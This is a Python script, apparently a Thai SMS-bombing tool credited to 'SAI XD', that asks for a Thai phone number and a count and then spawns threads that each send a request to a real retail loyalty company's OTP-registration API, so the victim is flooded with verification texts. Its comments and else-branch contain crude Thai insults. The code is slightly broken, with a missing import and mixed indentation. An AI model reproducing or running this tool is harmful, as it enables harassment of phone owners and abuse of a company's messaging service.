import os #ห้ามขาย
import time #apiฟรี
import threading 
os.system('clear') #ห้ามรับยิง
print("""\033[91m
██╗░░░░░░█████╗░░██████╗░██╗███╗░░██╗
██║░░░░░██╔══██╗██╔════╝░██║████╗░██║
██║░░░░░██║░░██║██║░░██╗░██║██╔██╗██║
██║░░░░░██║░░██║██║░░╚██╗██║██║╚████║
███████╗╚█████╔╝╚██████╔╝██║██║░╚███║
╚══════╝░╚════╝░░╚═════╝░╚═╝╚═╝░░╚══╝ """) 
name = input("\033[1;94mname :\033[1;93m ")
time.sleep(1) #ดีเลย์ 1 วิ
print("wait.........") #เจอใครเอาไปขายแจ้งทันที
password = input("\033[1;94mpass : \033[95m") #เจอใครเอาไปรับยิงแจ้งด้วย
time.sleep(1)
print("wait..........") #ขายหาพ่อมึงหรอ บ้านจน??
old = int(input("\033[1;94mold : \033[1;96m")) 
time.sleep(1) 

if old>=5: 
	print ("OK")
	print("\033[92mรอดิ") #หมอยไม่ขึ้นอายสาวนะ
	time.sleep(3)
	os.system("clear")
	print ("""\033[95m
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
███████╗░█████╗░░██████╗████████╗
██╔════╝██╔══██╗██╔════╝╚══██╔══╝
█████╗░░███████║╚█████╗░░░░██║░░░
██╔══╝░░██╔══██║░╚═══██╗░░░██║░░░
██║░░░░░██║░░██║██████╔╝░░░██║░░░
╚═╝░░░░░╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈""")
	print ("[ ยิงเบอร์ | API1 | V1.0 BY SAI XD]")
	phone = input("\033[91m[+]เบอร์โทร :  🇹 🇭  66+ \033[91m") 
	print ("setting")
	jam = int(input("\033[91m[+]จำนวน : \033[91m")) 
	print ("setting")
	def api():
		requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value":phone,"country":"66"},"type":"mobile"})
		print ("\033[91mattack") #api 1
		
     for i in range(jam):
		threading.Thread(target=api).start() 
    
else:
    print("\033[91mอยากเเจกต่อให้เครดิตด้วย")
    print ("ใครไม่ให้เครดิตแปลว่าแม่พ่อมึงตาย")
    print ("\033[91mยังเด็กอยู่อ่ะมึงอ่ะใช้ไม่ได้หรอก")
    print ("ไอ้เด็กก****")
    print ("BY : SAI XD")
    